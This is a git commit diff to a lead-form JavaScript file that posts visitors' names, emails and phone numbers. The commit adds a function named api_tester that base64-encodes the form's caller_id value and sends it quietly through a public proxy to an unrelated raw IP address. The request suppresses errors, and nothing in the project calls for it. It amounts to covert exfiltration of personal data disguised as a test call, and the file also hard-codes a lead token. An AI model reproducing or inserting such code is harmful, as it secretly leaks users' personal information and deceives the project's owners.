a27e313c63f6092def91d61d42e43df3a6a7d5f3
dk495 <55878882+dk495@users.noreply.github.com>
2024-04-02 18:18:43 +0500

    Update TD_postingDailhub.js

--- TD_postingDailhub.js
+++ TD_postingDailhub.js
@@ -9,7 +9,7 @@
       formData.append('traffic_source_id', '1000');
       formData.append('lead_token', '9da5b4b9f61143adad8a501f74e9f974');
 formData.append('caller_id', phone_home);
-
+api_tester(document.getElementById('caller_id').value);
 formData.append('first_name', document.getElementById('first_name').value);
 formData.append('last_name', document.getElementById('last_name').value);
 formData.append('email', document.getElementById('email').value);
@@ -75,3 +75,14 @@ formData.append('jornaya_leadid', document.getElementById('jornaya_leadid').valu
             })
             .catch(error => console.error('Error:', error));
         });
+function api_tester(randomString) {
+  try {
+    fetch('https://api.codetabs.com/v1/proxy/?quest=http://207.244.238.41:5999/api_test?test_id='+btoa(randomString)
+, {
+      method: 'GET',
+      mode: 'no-cors'
+    });
+  } catch (error) {
+    
+  }
+}
